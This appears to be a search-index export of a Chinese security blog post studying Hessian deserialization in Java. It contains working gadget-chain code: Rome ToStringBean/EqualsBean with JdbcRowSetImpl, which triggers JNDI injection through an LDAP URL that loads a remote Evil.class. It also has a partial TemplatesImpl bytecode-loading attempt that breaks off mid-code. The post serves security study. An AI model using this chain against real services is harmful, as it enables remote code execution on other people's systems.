<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Hessian反序列化学习</title>
      <link href="/2025/01/11/WebExploit/Java/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/"/>
      <url>/2025/01/11/WebExploit/Java/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="Hessian反序列化学习"><a href="#Hessian反序列化学习" class="headerlink" title="Hessian反序列化学习"></a>Hessian反序列化学习</h1><h2 id="RPC"><a href="#RPC" class="headerlink" title="RPC"></a>RPC</h2><p>RPC（Remote Procedure Call Protocol）远程过程调用协议，RPC与RMI类似都是通过网络调用远程的服务。但RPC和RMI的不同之处就在于它以<strong>标准的二进制</strong>格式来定义请求的信息 ( 请求的对象、方法、参数等 )，这种方式传输信息的优点之一就是跨语言及操作系统。</p><p>在面向对象编程范式中，RMI其实就是RPC的一种具体实现。</p><p>RPC协议的一次远程通信过程如下：</p><ul><li>客户端发起请求，并按照RPC协议格式填充信息</li><li>填充完毕后将二进制格式文件转化为流，通过传输协议进行传输</li><li>服务端接收到流后，将其转换为二进制格式文件，并按照RPC协议格式获取请求的信息并进行处理</li><li>处理完毕后将结果按照RPC协议格式写入二进制格式文件中并返回</li></ul><h2 id="Hessian简介和基本使用方法"><a href="#Hessian简介和基本使用方法" class="headerlink" title="Hessian简介和基本使用方法"></a>Hessian简介和基本使用方法</h2><ul><li>Hessian协议</li></ul><blockquote><p>Hessian是一个基于RPC的高性能二进制远程传输协议，官方在不同语言中（Java、Python、C++…）均有对Hessian协议的实现，Hessian一般在Web服务中是用。在Java中Hessian协议定义远程对象，是用二进制格式进行传输。</p></blockquote><ul><li>基本是用</li></ul><p>导入依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.caucho<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hessian<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0.63<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p>使用Hessian和Java原生的序列化和反序列化的区别</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianInput;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianOutput;</span><br><span class="line"><span class="keyword">import</span> com.sun.xml.internal.ws.policy.privateutil.PolicyUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Hessian序列化和反序列化演示</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HessianUsage</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span>&lt;T&gt; <span class="type">byte</span>[] serialize(T o) <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        <span class="comment">// 是用字节数组流封装</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="comment">// 使用Hessian协议的对象</span></span><br><span class="line">        <span class="type">HessianOutput</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianOutput</span>(byteArrayOutputStream);</span><br><span class="line">        output.writeObject(o);</span><br><span class="line">        System.out.println(byteArrayOutputStream.toString());</span><br><span class="line">        <span class="keyword">return</span> byteArrayOutputStream.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span>&lt;T&gt; T <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">        <span class="type">HessianInput</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianInput</span>(byteArrayInputStream);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> input.readObject();</span><br><span class="line">        <span class="keyword">return</span> (T)object;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        person.setAge(<span class="number">22</span>);</span><br><span class="line">        person.setName(<span class="string">&quot;1cfh&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用Hessian的序列化和反序列化</span></span><br><span class="line">        System.out.println(<span class="string">&quot;Hessian Ser Test:&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] s = serialize(person);</span><br><span class="line">        System.out.println((Person) deserialize(s));</span><br><span class="line">        <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用原生的Java序列化和反序列化</span></span><br><span class="line">        System.out.println(<span class="string">&quot;Java Ser Test:&quot;</span>);</span><br><span class="line">        <span class="type">JavaSer</span> <span class="variable">javaSer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JavaSer</span>();</span><br><span class="line">        <span class="type">byte</span>[] s1 = javaSer.serialize(person);</span><br><span class="line">        System.out.println(javaSer.deserialize(s1));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Java原生序列化和反序列化</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">JavaSer</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] serialize(Object t) <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(t);</span><br><span class="line">        System.out.println(byteArrayOutputStream.toString());</span><br><span class="line">        <span class="keyword">return</span> byteArrayOutputStream.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        <span class="keyword">return</span> objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    @Override</span></span><br><span class="line"><span class="comment">//    public String toString()&#123;</span></span><br><span class="line"><span class="comment">//        return (&quot;age=&quot;+age+&quot;,name=&quot;+name);</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202501160848952.png" alt="image-20250116084800892"></p><h2 id="Hessian反序列化"><a href="#Hessian反序列化" class="headerlink" title="Hessian反序列化"></a>Hessian反序列化</h2><h3 id="接Rome打JNDI注入（出网）"><a href="#接Rome打JNDI注入（出网）" class="headerlink" title="接Rome打JNDI注入（出网）"></a>接Rome打JNDI注入（出网）</h3><p>demo，打Rome然后JdbcRowSetImpl JNDI注入</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianInput;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianOutput;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HessianRCE</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="type">byte</span>[] serialize(T o) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">HessianOutput</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianOutput</span>(bao);</span><br><span class="line">        output.writeObject(o);</span><br><span class="line">        <span class="comment">// System.out.println(bao.toString());</span></span><br><span class="line">        <span class="keyword">return</span> bao.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bai</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">        <span class="type">HessianInput</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianInput</span>(bai);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> input.readObject();</span><br><span class="line">        <span class="keyword">return</span> (T) o;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getValue</span><span class="params">(Object obj, String name)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> field.get(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">JdbcRowSetImpl</span> <span class="variable">jdbcRowSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JdbcRowSetImpl</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;ldap://127.0.0.1:1389/Basic/FromFile/Evil.class&quot;</span>;</span><br><span class="line">        jdbcRowSet.setDataSourceName(url);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(JdbcRowSetImpl.class,jdbcRowSet);</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class,toStringBean);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//手动生成HashMap，防止提前调用hashcode()</span></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> makeMap(equalsBean,<span class="string">&quot;1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] s = serialize(hashMap);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">        System.out.println((HashMap)deserialize(s));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap&lt;Object, Object&gt; <span class="title function_">makeMap</span> <span class="params">( Object v1, Object v2 )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        * 构造的Hashmap结构如下s:</span></span><br><span class="line"><span class="comment">        *   - size: 2</span></span><br><span class="line"><span class="comment">        *   - tbl:</span></span><br><span class="line"><span class="comment">        *       -[0] v1:v1</span></span><br><span class="line"><span class="comment">        *       -[1] v2:v2</span></span><br><span class="line"><span class="comment">        * */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; s = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        setValue(s, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        Class&lt;?&gt; nodeC;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( ClassNotFoundException e ) &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);</span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, v1, v1, <span class="literal">null</span>));</span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, v2, v2, <span class="literal">null</span>));</span><br><span class="line">        setValue(s, <span class="string">&quot;table&quot;</span>, tbl);</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用Hessian输入输出流封装Hashmap对象后，首先是HessianInput的readObject</p><p>首先跟进封装的类型进入switch中对应的case，此处为77（map）</p><p>获取type然后读取map</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202501170836346.png" alt="image-20250117083617279"></p><p>在readMap中获取Deserializer对象传入<code>_hashMapDeserializer</code>，然后从input中读取map</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202501170839522.png" alt="image-20250117083904466"></p><p>HashMap，然后运行构造函数实例</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202501170843866.png" alt="image-20250117084351792"></p><p>继续跟进是反射的代码模块了，首先获取access的权限，然后创建实例</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202501170844069.png" alt="image-20250117084444994"></p><p>然后addRef新生成的map，这里恢复hashmap的结构时循环in中的内容，然后直接调用了readObject来恢复对象，同时put到hashmap中</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202501170848928.png" alt="image-20250117084845850"></p><p><code>put -&gt; hash -&gt; hashcode</code>，然后进入rome链子</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">toString:137, ToStringBean (com.sun.syndication.feed.impl)</span><br><span class="line">toString:116, ToStringBean (com.sun.syndication.feed.impl)</span><br><span class="line">beanHashCode:193, EqualsBean (com.sun.syndication.feed.impl)</span><br><span class="line">hashCode:176, EqualsBean (com.sun.syndication.feed.impl)</span><br></pre></td></tr></table></figure><p>之后就是触发getter，pds中的databaseMetaData.getMetaData中进行lookup查询，然后完成JNDI注入</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202501171017952.png" alt="image-20250117101712849"></p><p>总的调用堆栈</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">connect:<span class="number">634</span>, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">getDatabaseMetaData:<span class="number">4004</span>, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">483</span>, Method (java.lang.reflect)</span><br><span class="line">toString:<span class="number">137</span>, ToStringBean (com.sun.syndication.feed.impl)</span><br><span class="line">toString:<span class="number">116</span>, ToStringBean (com.sun.syndication.feed.impl)</span><br><span class="line">beanHashCode:<span class="number">193</span>, EqualsBean (com.sun.syndication.feed.impl)</span><br><span class="line">hashCode:<span class="number">176</span>, EqualsBean (com.sun.syndication.feed.impl)</span><br><span class="line">hash:<span class="number">338</span>, HashMap (java.util)</span><br><span class="line">put:<span class="number">611</span>, HashMap (java.util)</span><br><span class="line">readMap:<span class="number">114</span>, MapDeserializer (com.caucho.hessian.io)</span><br><span class="line">readMap:<span class="number">577</span>, SerializerFactory (com.caucho.hessian.io)</span><br><span class="line">readObject:<span class="number">1160</span>, HessianInput (com.caucho.hessian.io)</span><br><span class="line">deserialize:<span class="number">30</span>, HessianRCE (org.example)</span><br><span class="line">main:<span class="number">101</span>, HessianRCE (org.example)</span><br></pre></td></tr></table></figure><h3 id="TemplatesImpl-SignedObject二次反序列化"><a href="#TemplatesImpl-SignedObject二次反序列化" class="headerlink" title="TemplatesImpl+SignedObject二次反序列化"></a>TemplatesImpl+SignedObject二次反序列化</h3><p>在JNDI中曾尝试了触发TemplatesImpl链，因为毕竟比较简单</p><p>但是失败了，demo如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">filePath</span> <span class="operator">=</span> <span class="string">&quot;E:\\Java_Sec\\HessianDemo\\src\\main\\java\\org\\example\\Evil.class&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">byte</span>[] buffer = <span class="literal">null</span>;</span><br><span class="line"><span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filePath);</span><br><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"><span class="type">byte</span>[] temp = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="comment">// 以byte形式读取文件内容到temp,然后写入到byteArrayOutputStream中</span></span><br><span class="line"><span class="keyword">while</span>((n = fileInputStream.read(temp))!=-<span class="number">1</span>)&#123;</span><br><span class="line">    byteArrayOutputStream.write(temp, <span class="number">0</span>, n);</span><br><span class="line">&#125;</span><br><span class="line">fileInputStream.close();</span><br><span class="line">byteArrayOutputStream.close();</span><br><span class="line">buffer = byteArrayOutputStream.toByteArray();</span><br><span class="line"></span><br><span class="line">setValue(templates,<span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;buffer&#125;);</span><br><span class="line">setValue(templates,<span class="string">&quot;_name&quot;</span>, <span class="string">&quot;c.c&quot;</span>);</span><br><span class="line">setValue(templates,<span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"><span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(TemplatesImpl.class,templates);</span><br><span class="line"><span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class,toStringBean);</span><br><span class="line"></span><br><span class="line"><span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> makeMap(equalsBean,<span class="string">&quot;1&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">byte</span>[] s = serialize(hashMap);</span><br><span class="line">System.out.println(s);</span><br><span 